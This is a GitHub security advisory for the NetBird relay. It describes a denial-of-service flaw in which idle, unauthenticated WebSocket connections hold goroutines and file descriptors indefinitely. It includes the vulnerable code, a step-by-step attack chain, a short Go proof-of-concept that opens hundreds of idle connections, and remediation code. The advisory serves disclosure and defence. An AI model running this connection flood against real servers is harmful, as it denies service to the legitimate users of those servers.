{"author": null, "closed_at": null, "collaborating_teams": null, "collaborating_users": null, "created_at": null, "credits": [{"login": "bugbunny-research", "type": "reporter"}], "credits_detailed": [{"state": "accepted", "type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/262839898?v=4", "events_url": "https://api.github.com/users/bugbunny-research/events{/privacy}", "followers_url": "https://api.github.com/users/bugbunny-research/followers", "following_url": "https://api.github.com/users/bugbunny-research/following{/other_user}", "gists_url": "https://api.github.com/users/bugbunny-research/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/bugbunny-research", "id": 262839898, "login": "bugbunny-research", "node_id": "U_kgDOD6qeWg", "organizations_url": "https://api.github.com/users/bugbunny-research/orgs", "received_events_url": "https://api.github.com/users/bugbunny-research/received_events", "repos_url": "https://api.github.com/users/bugbunny-research/repos", "site_admin": false, "starred_url": "https://api.github.com/users/bugbunny-research/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/bugbunny-research/subscriptions", "type": "User", "url": "https://api.github.com/users/bugbunny-research", "user_view_type": "public"}}], "cve_id": null, "cvss": {"score": 7.5, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}, "cvss_severities": {"cvss_v3": {"score": 7.5, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}, "cvss_v4": {"score": null, "vector_string": null}}, "cwe_ids": [], "cwes": [], "description": "## Summary

The NetBird relay's WebSocket listener uses Go's `http.Server` with no `ReadTimeout`, `WriteTimeout`, or `IdleTimeout`, and the relay handshake read has no deadline. Any client that completes the HTTP WebSocket upgrade but sends no application frame holds a blocked goroutine and a file descriptor indefinitely. By opening a large number of such idle connections, an unauthenticated attacker can exhaust the server's available file descriptors and degrade relay performance, denying service to legitimate peers. The relay's own healthcheck HTTP server sets proper timeouts, confirming codebase awareness of the risk.

## Severity

**High** (CVSS 3.1: 7.5)

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

- **Attack Vector:** Network — the relay WebSocket listener is internet-exposed and accepts HTTP upgrades from any client with no prior authentication.
- **Attack Complexity:** Low — opening idle WebSocket connections requires no special knowledge, timing, or chaining; standard tooling suffices.
- **Privileges Required:** None — WebSocket upgrade completes before any relay authentication check runs; no token or credential is needed to hold a goroutine.
- **User Interaction:** None
- **Scope:** Unchanged — impact is confined to the relay process's resources; the relay process itself handles both the attack surface and the impact.
- **Confidentiality Impact:** None
- **Integrity Impact:** None
- **Availability Impact:** High — at sufficient connection volume, OS file descriptor limits are exhausted and new connections are refused; prior to exhaustion, thousands of blocked goroutines degrade relay scheduling and increase memory pressure.

## Affected Component

- `relay/server/listener/ws/listener.go` — `(*Listener).Listen` / `(*http.Server)` (line 38) — no HTTP server timeouts
- `relay/server/listener/ws/conn.go` — `(*Conn).Read` (line 38) — blocking read with `context.Background()`
- `relay/server/relay.go` — `(*Relay).Accept` (line 125) — no handshake deadline before `handshakeReceive()`
- `relay/server/handshake.go` — `(*handshake).handshakeReceive` (line 71) — blocking read, no deadline

## CWE

- **CWE-400**: Uncontrolled Resource Consumption
- **CWE-770**: Allocation of Resources Without Limits or Throttling

## Description

### WebSocket upgrade completes before authentication, blocking goroutines indefinitely

The relay WebSocket listener routes all connections through Go's HTTP server, which spawns one goroutine per request. The HTTP upgrade to WebSocket happens in `onAccept`, and immediately after upgrade, `acceptFn(conn)` (i.e., `relay.Accept`) is called — still in that goroutine:

```go
// relay/server/listener/ws/listener.go – lines 74-108
func (l *Listener) onAccept(w http.ResponseWriter, r *http.Request) {
    wsConn, err := websocket.Accept(w, r, acceptOptions)   // ← HTTP upgrade complete here
    // ...
    conn := NewConn(wsConn, lAddr, rAddr)
    l.acceptFn(conn)   // ← relay.Accept; blocks until handshake completes
}
```

Inside `relay.Accept`, the handshake read blocks before any authentication check occurs:

```go
// relay/server/relay.go – lines 120-136
h := handshake{conn: conn, validator: r.validator, ...}
peerID, err := h.handshakeReceive()   // ← blocks here

// relay/server/handshake.go – lines 69-71
func (h *handshake) handshakeReceive() (*messages.PeerID, error) {
    buf := make([]byte, messages.MaxHandshakeSize)
    n, err := h.conn.Read(buf)   // ← blocks until frame arrives or connection closes
```

The WS `conn.Read` uses `context.Background()` — no deadline:

```go
// relay/server/listener/ws/conn.go – lines 38-53
func (c *Conn) Read(b []byte) (n int, err error) {
    t, r, err := c.Reader(c.ctx)   // c.ctx = context.Background() — no timeout
    // ...
}
```

`SetReadDeadline` is unimplemented and returns an error (conn.go:75-77), so even if the relay tried to set a deadline, it would silently fail.

### The WS HTTP server has no connection-limiting configuration

The relay's main WebSocket HTTP server is created with no timeouts:

```go
// relay/server/listener/ws/listener.go – lines 38-43
l.server = &http.Server{
    Addr:      l.Address,
    Handler:   mux,
    TLSConfig: l.TLSConfig,
    // No ReadTimeout, WriteTimeout, IdleTimeout, or connection limit
}
```

Go's `net/http` server spawns a new goroutine for each accepted connection and imposes no built-in limit on concurrent connections. With all three timeout fields at zero, the server holds each connection goroutine until the peer disconnects or the process dies.

### The healthcheck server uses timeouts — confirming awareness of the risk

The relay's healthcheck server (a separate endpoint for monitoring) properly configures HTTP timeouts:

```go
// relay/healthcheck/healthcheck.go – lines 63-67
&http.Server{
    Addr:         config.ListenAddress,
    Handler:      mux,
    ReadTimeout:  5 * time.Second,
    WriteTimeout: 10 * time.Second,
    IdleTimeout:  15 * time.Second,
}
```

The relay team is aware of HTTP server timeout hygiene and has applied it to the healthcheck endpoint; the omission from the main relay listener is an inconsistency, not an oversight of the pattern.

### Full execution chain

1. Attacker opens a TCP connection to the relay server on the WebSocket port.
2. Attacker sends a valid HTTP WebSocket upgrade request (`GET /relay HTTP/1.1`, `Upgrade: websocket`, etc.). No relay auth token is required at this stage.
3. Go's `http.Server` spawns a goroutine for the connection, which calls `onAccept`, which calls `websocket.Accept` — completing the upgrade.
4. `l.acceptFn(conn)` is called; `relay.Accept` → `handshakeReceive()` → `conn.Read()` blocks indefinitely.
5. The attacker sends no WebSocket frames. The goroutine is now permanently blocked, holding one OS file descriptor.
6. Attacker repeats steps 1–5 in a loop across thousands of connections.
7. With ~65,000 connections (the typical per-process file descriptor limit), the relay process exhausts its fd allocation. New TCP connections are refused by the OS.
8. All legitimate relay clients (both existing QUIC and WS) can no longer establish new sessions.

### Resource consumption before exhaustion

Even before full fd exhaustion, each idle goroutine consumes:
- An OS file descriptor (TCP socket)
- ~2–64 KB of goroutine stack (Go stacks grow dynamically)
- Go scheduler overhead (each blocked goroutine is woken and re-scheduled periodically)

With 10,000 idle connections, the relay accumulates significant scheduler noise and memory pressure that degrades forwarding performance for legitimate peers.

## Proof of Concept

The reporter's PoC logic is correct. A simplified repro:

```go
package main

import (
    "context"
    "fmt"
    "runtime"
    "time"

    "github.com/coder/websocket"
)

func main() {
    relayAddr := "ws://<relay-host>/relay"

    baseline := runtime.NumGoroutine()
    fmt.Printf("Baseline goroutines: %d\n", baseline)

    conns := make([]*websocket.Conn, 0, 500)
    for i := 0; i < 500; i++ {
        c, _, err := websocket.Dial(context.Background(), relayAddr, nil)
        if err != nil {
            fmt.Printf("Connection %d failed: %v\n", i, err)
            break
        }
        conns = append(conns, c)
        // send NO frames — connection is idle after WS upgrade
    }

    time.Sleep(1 * time.Second)
    fmt.Printf("Goroutines after 500 idle WS connections: %d\n", runtime.NumGoroutine())
    // Expected: baseline + ~500 (each idle connection holds a blocked goroutine)

    // Legitimate peer can no longer complete handshake
    // ... (all server goroutines are blocked on idle connections)

    for _, c := range conns {
        _ = c.CloseNow()
    }
}
```

**Expected results:** goroutine count rises by approximately one per idle connection; at OS fd-limit scale, new connection attempts fail with "connection refused" or "too many open files."

## Impact

- Any host with network access to the relay's WebSocket port can exhaust the relay process's file descriptors with no credentials required.
- Prior to full exhaustion, thousands of idle connections consume goroutines and memory, degrading relay throughput for legitimate authenticated peers.
- Unlike the companion QUIC serial-handshake DoS (which requires only one idle connection), this attack targets the primary WebSocket transport and scales with the attacker's connection capacity.
- The relay has no rate limiting, connection counting, or idle-connection reaping; the server cannot distinguish idle attack connections from slow-starting legitimate clients.
- Exhaustion persists until the attacker disconnects or the relay process is restarted.

## Recommended Remediation

### Option 1: Apply a handshake read deadline in relay.Accept (preferred — protects both WS and QUIC paths)

Set a deadline before `handshakeReceive()` so idle pre-auth connections are reaped after a bounded period:

```go
// relay/server/relay.go — add before handshakeReceive
const handshakeTimeout = 10 * time.Second

if err := conn.SetDeadline(time.Now().Add(handshakeTimeout)); err != nil {
    log.Warnf("failed to set handshake deadline for %s: %v", conn.RemoteAddr(), err)
    // proceed — best-effort
}
peerID, err := h.handshakeReceive()
if err != nil {
    conn.Close()
    return
}
// Clear deadline after successful handshake
_ = conn.SetDeadline(time.Time{})
```

For this to work, `SetDeadline` (and `SetReadDeadline`) must be implemented in both `ws/conn.go` and `quic/conn.go` rather than returning errors or no-ops. For the WS conn:

```go
// relay/server/listener/ws/conn.go
func (c *Conn) SetDeadline(t time.Time) error {
    c.conn.SetReadLimit(...)  // may not map directly; use context deadline below
    // Store deadline and apply via context in Read()
    c.readDeadline = t
    return nil
}

func (c *Conn) Read(b []byte) (n int, err error) {
    ctx := c.ctx
    if !c.readDeadline.IsZero() {
        var cancel context.CancelFunc
        ctx, cancel = context.WithDeadline(c.ctx, c.readDeadline)
        defer cancel()
    }
    t, r, err := c.Reader(ctx)
    // ...
}
```

### Option 2: Add HTTP server timeouts to the WS listener (defense-in-depth)

Configure `ReadTimeout` and `IdleTimeout` on the WebSocket HTTP server, matching what the healthcheck server already uses:

```go
// relay/server/listener/ws/listener.go — add timeouts
l.server = &http.Server{
    Addr:      l.Address,
    Handler:   mux,
    TLSConfig: l.TLSConfig,
    ReadTimeout:  10 * time.Second,   // ADD: close idle pre-upgrade connections
    WriteTimeout: 30 * time.Second,
    IdleTimeout:  60 * time.Second,
}
```

Note: `ReadTimeout` applies to the full request including body. For WebSocket connections, the HTTP server's timeout governs the upgrade phase but not the post-upgrade phase. Option 1 remains necessary to bound the post-upgrade handshake read.

### Option 3: Limit concurrent pre-authentication connections (defense-in-depth)

Use `netutil.LimitListener` or a semaphore to cap the number of connections that can be in the handshake phase simultaneously:

```go
import "golang.org/x/net/netutil"

// Wrap the listener to accept at most N concurrent connections
l.server.Handler = http.MaxBytesHandler(mux, 1<<20)
// or at the TCP listener level:
listener = netutil.LimitListener(listener, 10000)
```

This adds a hard ceiling on the attack's amplification factor.

## Credit

This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

title: Relay WebSocket Listener Leaks Goroutines on Unauthenticated Idle Connections, Enabling Resource Exhaustion DoS
